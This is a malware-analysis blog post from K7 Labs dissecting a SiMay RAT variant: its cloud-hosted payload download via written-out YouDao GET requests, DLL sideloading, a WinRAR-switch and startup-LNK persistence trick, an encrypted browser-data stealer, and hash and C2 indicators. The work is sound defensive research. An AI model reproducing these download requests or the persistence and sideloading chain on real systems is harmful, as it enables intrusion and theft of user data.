<div>
<img alt="" class="hidden-social-img" src="https://labs.k7computing.com/wp-content/uploads/2022/05/SiMay-RAT.png" style="max-width:80%;height:auto;width:auto;"/>
<a class="uncategorized" href="https://labs.k7computing.com/index.php/category/uncategorized/">Uncategorized</a>
<h1 class="entry-title">Sneaky SiMay</h1>
By Andrew SheltonMay 31, 2022
 
<p></p><p>Hackers have been abusing cloud services to host their malicious payloads and then use a downloader/loader to deploy them in the victim’s machine. Recently we came across a Remote Access Trojan (RAT) sample doing an activity on similar lines. This has been shared in VirusTotal. This sample was later identified as a variant of SiMay RAT. At the time of writing this blog, the sample under consideration had a low AV detection rate in VT, which further increased our curiosity to dive deeper into this. Not only that, there were also a few more samples of the SiMay RAT variant that were uploaded in VT with different hashes.</p>
<p>While analysing the main sample, we identified it as a Multistage downloader/loader, which downloads the payload as a zip file (from the cloud service that is subscribed to by the attacker) and executes one of the legit executable with a malicious dll file (which are inside the zip) in memory using DLL sideloading method.</p>
<p>In this blog we will discuss how the SiMay RAT is downloaded as a payload from the cloud, deployed in the machine, its persistence and how it goes about loading the malicious DLL.</p>
<figure class="wp-caption aligncenter" id="attachment_24059"><img alt="" class="size-full wp-image-24059" height="875" src="https://labs.k7computing.com/wp-content/uploads/2022/05/Figure1-3.png" style="max-width:800px;height:auto;width:auto;" width="1131"/><figcaption class="wp-caption-text" id="caption-attachment-24059">Figure 1: Workflow of SiMay RAT</figcaption></figure>
<h3></h3>
<h3>Analysing the Binary</h3>
<p>On analysing the sample, we noticed that the main loader has a Windows File Explorer icon , which can be deceiving to a user who can unknowingly execute the same.</p>
<p>The executable was a VC8 compiled binary. The TimeDateStamp indicates it was compiled on 10th of April 2022. There were multiple URLs hard coded in the binary as shown in Figure 2. We will be getting into the deets of these URLs later in this blog during the payload download process.</p>
<figure class="wp-caption aligncenter" id="attachment_24060"><img alt="" class="size-full wp-image-24060" height="97" src="https://labs.k7computing.com/wp-content/uploads/2022/05/Figure2-3.png" style="max-width:800px;height:auto;width:auto;" width="986"/><figcaption class="wp-caption-text" id="caption-attachment-24060">Figure 2: Hardcoded URLs in Binary</figcaption></figure>
<h3></h3>
<h3>Behavioural Analysis</h3>
<h5>Payload Download Process :
</h5>
<p>The malware first tries to decrypt two executables that are already present in the data section. Code block for the same is shown in Figure 3</p>
<figure class="wp-caption aligncenter" id="attachment_24061"><img alt="" class="size-full wp-image-24061" height="513" src="https://labs.k7computing.com/wp-content/uploads/2022/05/Figure3-3.png" style="max-width:800px;height:auto;width:auto;" width="690"/><figcaption class="wp-caption-text" id="caption-attachment-24061">Figure 3: Decryption Loop for .NET Loaders</figcaption></figure>
<figure class="wp-caption aligncenter" id="attachment_24062"><img alt="" class="size-full wp-image-24062" height="249" src="https://labs.k7computing.com/wp-content/uploads/2022/05/Figure4-3.png" style="max-width:800px;height:auto;width:auto;" width="868"/><figcaption class="wp-caption-text" id="caption-attachment-24062">Figure 4: Decrypted .NET Binary</figcaption></figure>
<p>The decrypted executables are .NET compiled binaries. While debugging we found that the first executable to be named as Cshape-CppHostingBridageAuto and is used for performing multiple operations like invoking a process, writing a binary from the memory and helping with resolving web request for the loader, and the second executable is named as CShapeHosting and is responsible for downloading the payload.</p>
<figure class="wp-caption aligncenter" id="attachment_24063"><img alt="" class="size-full wp-image-24063" height="274" src="https://labs.k7computing.com/wp-content/uploads/2022/05/Figure5-3.png" style="max-width:800px;height:auto;width:auto;" width="911"/><figcaption class="wp-caption-text" id="caption-attachment-24063">Figure 5: Downloader Function in CShapeHosting executable</figcaption></figure>
<ul>
<li>The CShapeHosting will get the arguments from the Main Loader and tries to contact the ip 59.111.183[.]194 which is corresponding to the domain note.youdao.com (A Chinese cloud service provider) using GET request as:</li>
</ul>
<p>GET /yws/api/personal/share?method=get&amp;shareKey=cfae45c9e7cc8a7734b72abe98235dd1 HTTP/1.0</p>
<p>Host: note.youdao[.]com</p>
<p>To which the server responds with a JSON with interesting strings :</p>
<p>“id”:”WEB842633ba1786c31f2996429d59ceca79″,”userId”:”quanshiyu2022@163.com“,”name”: GUDUO, “shareTime”:1639822384952 (2021-12-18)</p>
<p>We can see that a share has been activated way before the malware binary was compiled, showing that the malware actors had spent quite some time planning this campaign.</p>
<ul>
<li>After parsing the JSON data, the malware creates another GET request as:</li>
</ul>
<p>GET /yws/public/notebook/cfae45c9e7cc8a7734b72abe98235dd1/subdir/WEB842633ba1786c31f2996429d59ceca79 HTTP/1.0</p>
<p>As we can see the subdir/WEB842633ba1786c31f2996429d59ceca79 is retrieved from the JSON data. Now the server replies with yet another JSON data which contains interesting information for the payloads that is stored in the attacker’s share that includes the necessary keys for accessing the file like a web path “p”:”/&lt;PATH_TO_FILE&gt;” and file name “tl”:”&lt;FILE_NAME&gt;.zip”</p>
<p>For the sample under analysis, the share contains around 27 malicious payloads.</p>
<ul>
<li>It now takes one of the zip file and tries to download it with another GET request as:</li>
</ul>
<p>GET /yws/api/personal/file/WEB4e6116b430403afd518512b82258a50d?method=download&amp;shareKey=cfae45c9e7cc8a7734b72abe98235dd1 HTTP/1.0</p>
<p>Here id WEB4e6116b430403afd518512b82258a50d is retrieved from the previous JSON data, for which the server replies with the direct path to the malicious zip file (in our case it is o.zip) to be downloaded. The sample is then downloaded to the “%USER%/Public/&lt;root&gt;” folder.</p>
<figure class="wp-caption aligncenter" id="attachment_24064"><img alt="" class="size-full wp-image-24064" height="577" src="https://labs.k7computing.com/wp-content/uploads/2022/05/Figure6-4.png" style="max-width:800px;height:auto;width:auto;" width="1359"/><figcaption class="wp-caption-text" id="caption-attachment-24064">Figure 6: Multiple Payloads from YouDao Cloud Share seen in a Web Interface</figcaption></figure>
<h3></h3>
<h3>Analysing the Payload Archive</h3>
<p>The contents of the zip file will look like this :</p>
<figure class="wp-caption aligncenter" id="attachment_24065"><img alt="" class="size-full wp-image-24065" height="84" src="https://labs.k7computing.com/wp-content/uploads/2022/05/Figure7-3.png" width="325"/><figcaption class="wp-caption-text" id="caption-attachment-24065">Figure 7: Contents of Zip Archive</figcaption></figure>
<p>The main sample then extracts and writes the contents from the zip file to predefined locations as below:</p>
<p>Contents of the folder named “package” are copied to “C:\Users\Public\Documents\efender\&lt;random_name&gt;\&lt;files&gt;” which consist of the malicious DLL (GLUT32.dll), a legit executable exe (washost.exe) in which the DLL will be side-loaded later, and an XML file which will be used by the DLL later in the execution chain.</p>
<p>Contents of the folder named “static” are copied to “C:\ProgramData\” as Windows-updatadfinder-CProgramData which will be used as a stealer and will be explained later in the blog.</p>
<p>Content of the folder name “winzipper” (fdaf1.fda1gfq) is copied to C:\Users\Public\Downloads which is a command line version of WinRAR. This file is used for creating persistence for the payload.</p>
<h3></h3>
<h3>Creating Persistence</h3>
<p>After extracting the payloads, the malware uses the WinRAR <a href="https://research.checkpoint.com/2019/extracting-code-execution-from-winrar/">vulnerability </a>to create persistence where the WinRAR CLI payload comes into play. First, it creates a rar.ini file in the Public\Downloads folder that has the string “switches=-opC:\Users\&lt;user_name&gt;\AppData\Roaming –y”, as the WinRAR CLI can read the set of switches from the rar.ini. This switch describes the default location for the archive to be decompressed.</p>
<p>Now the malware creates an lnk file in “C:\Users\Public\Downloads\mobisample_start.lnk” targeting the exe payload from “C:\Users\Public\Documents\efender\&lt;random_name&gt;\&lt;executable_name&gt;”.</p>
<figure class="wp-caption aligncenter" id="attachment_24066"><img alt="" class="size-full wp-image-24066" height="109" src="https://labs.k7computing.com/wp-content/uploads/2022/05/Figure8-3.png" width="639"/><figcaption class="wp-caption-text" id="caption-attachment-24066">Figure 8: Function to Create LNK file</figcaption></figure>
<p>The created lnk file is then compressed to &lt;random&gt;.rar file in the same location by the WinRAR CLI tool with arguments as seen in Figure 9.</p>
<figure class="wp-caption aligncenter" id="attachment_24067"><img alt="" class="size-full wp-image-24067" height="136" src="https://labs.k7computing.com/wp-content/uploads/2022/05/Figure9-3.png" style="max-width:800px;height:auto;width:auto;" width="819"/><figcaption class="wp-caption-text" id="caption-attachment-24067">Figure 9: Argument for WinRAR CLI tool</figcaption></figure>
<p>Another lnk file is then created by the malware with a random name in the path C:\Users\Public\Music which has the target as :</p>
<p> “C:\Users\Public\Downloads\&lt;winrar_CLI&gt;.exe x C:\Users\Public\Downloads\&lt;random&gt;.rar”</p>
<p>where the argument “x” is used for extracting files with a full path. The malware then creates an instance of explorer.exe with the address as “C:\Users\Public\Music” and runs in the background with the help of CppHostingBridageAuto as shown in the Figure below.</p>
<figure class="wp-caption aligncenter" id="attachment_24068"><img alt="" class="size-full wp-image-24068" height="273" src="https://labs.k7computing.com/wp-content/uploads/2022/05/Figure10-3.png" width="494"/><figcaption class="wp-caption-text" id="caption-attachment-24068">Figure 10: Call to CppHostingBridageAuto from Loader</figcaption></figure>
<figure class="wp-caption aligncenter" id="attachment_24069"><img alt="" class="size-full wp-image-24069" height="308" src="https://labs.k7computing.com/wp-content/uploads/2022/05/Figure11-2.png" style="max-width:800px;height:auto;width:auto;" width="872"/><figcaption class="wp-caption-text" id="caption-attachment-24069">Figure 11: Auto Function responsible for Invoking Explorer</figcaption></figure>
<p>The invoked explorer.exe is then used to start the lnk file that was created in Public\Music folder which will now extract the archived lnk file mobisample_start.lnk to the “%Appdata%\Roaming\ Microsoft\Windows\Start Menu\Programs\startup” folder. There by achieving persistence.</p>
<h3></h3>
<h3>Executing the Payload</h3>
<p>After creating persistence, the malware renames the dropped file “Windows-updatadfinder-CProgramData” from ProgramData to Shell.txt which contains the shell code which will be used by the payload to perform the “stealer” activity.</p>
<p>To execute the payload, the malware then creates a URL file in the path “C:\Users\Public\Music”, which will be executed using the already invoked explorer process.</p>
<figure class="wp-caption aligncenter" id="attachment_24070"><img alt="" class="size-full wp-image-24070" height="64" src="https://labs.k7computing.com/wp-content/uploads/2022/05/Figure12-2.png" width="474"/><figcaption class="wp-caption-text" id="caption-attachment-24070">Figure 12: Target of the URL file</figcaption></figure>
<p>The payload &lt;random&gt;.exe then gets executed with the GLUT32.dll side-loaded, whereas the export functions of the DLL have the same name as available in the genuine version of the DLL. We also identified that the DLL has strings “Blackmoon” which corresponds to a Chinese compiler used in the <a href="https://www.proofpoint.com/us/threat-insight/post/Updated-Blackmoon-Banking-Trojan">2014 KrBanker Trojan attack</a> in South Korea.</p>
<figure class="wp-caption aligncenter" id="attachment_24071"><img alt="" class="size-full wp-image-24071" height="112" src="https://labs.k7computing.com/wp-content/uploads/2022/05/Figure13-2.png" style="max-width:800px;height:auto;width:auto;" width="742"/><figcaption class="wp-caption-text" id="caption-attachment-24071">Figure 13: Malicious DLL sideloaded to legit executable</figcaption></figure>
<p>We noticed that all the export functions in the sideloaded DLL do the same task by calling a same function which decrypts the xml file “wc.xml” and then uses the contents to create a new shell.ini file in “C:\programdata\shell.ini”. The shell.ini file contains the C2 server’s IP address that the payload needs to contact.</p>
<figure class="wp-caption aligncenter" id="attachment_24072"><img alt="" class="size-full wp-image-24072" height="213" src="https://labs.k7computing.com/wp-content/uploads/2022/05/Figure14-1.png" width="301"/><figcaption class="wp-caption-text" id="caption-attachment-24072">Figure 14: Contents of shell.ini file</figcaption></figure>
<p>The shell.txt contains shell code to import modules and a PE file (encrypted) where each byte is XORed by 25h. Further, the decrypted PE file had the original DLL name as server.dll. It also had multiple strings related to different browser names and their paths for user data this dll acts as a stealer for the RAT.</p>
<figure class="wp-caption aligncenter" id="attachment_24073"><img alt="" class="size-full wp-image-24073" height="347" src="https://labs.k7computing.com/wp-content/uploads/2022/05/Figure15-1.png" style="max-width:800px;height:auto;width:auto;" width="729"/><figcaption class="wp-caption-text" id="caption-attachment-24073">Figure 15: Suspicious strings in the Encrypted shell.txt file</figcaption></figure>
<p>This PE file will then be loaded into the memory space of the payload process and does the stealer activity when the attacker commands. The stolen data is then sent to the C2 server by the payload.</p>
<figure class="wp-caption aligncenter" id="attachment_24074"><img alt="" class="size-full wp-image-24074" height="83" src="https://labs.k7computing.com/wp-content/uploads/2022/05/Figure16.png" width="579"/><figcaption class="wp-caption-text" id="caption-attachment-24074">Figure 16: Payload contacting C2</figcaption></figure>
<p>We at K7 Labs provide detection against latest threats and also for this newer variant of SiMay RAT. Users are advised to use a reliable security product such as “K7 Total Security” and keep it up-to-date so as to safeguard their devices.</p>
<h3></h3>
<h3>Indicators of Compromise(IOC)</h3>
<table>
<tbody>
<tr>
<td>File Name</td>
<td>Hash</td>
<td>K7 Detection Name</td>
</tr>
<tr>
<td>b.exe (Initial Loader)</td>
<td>A641B3B81153936C6A3D3D99FE8D9736</td>
<td>Trojan ( 00590abd1 )</td>
</tr>
<tr>
<td>GLUT32.dll (RAT)</td>
<td>93FA023228112729F86015727346D1F8</td>
<td>Adware ( 00506e8d1 )</td>
</tr>
</tbody>
</table>
<h3>C2 : </h3>
<p>202.8.121[.]28</p>
<p> </p>
<p> </p>
<p></p>
<h3 class="comment-reply-title">Like what you're reading? Subscribe to our top stories.</h3>
<p>If you want to subscribe to our monthly newsletter, please submit the form below.</p> Email* : 
<ul class="controls">
<li class="previous-post mouse-leaving">
<h3>Previous Post« <a href="https://labs.k7computing.com/index.php/steer-clear-of-instant-loan-apps/" rel="prev">Steer Clear of Instant Loan Apps</a>
</h3>
</li>
<li class="next-post mouse-leaving">
<h3>Next Post
</h3>
</li>
</ul>
<h3 class="related-title">More Posts</h3>
</div>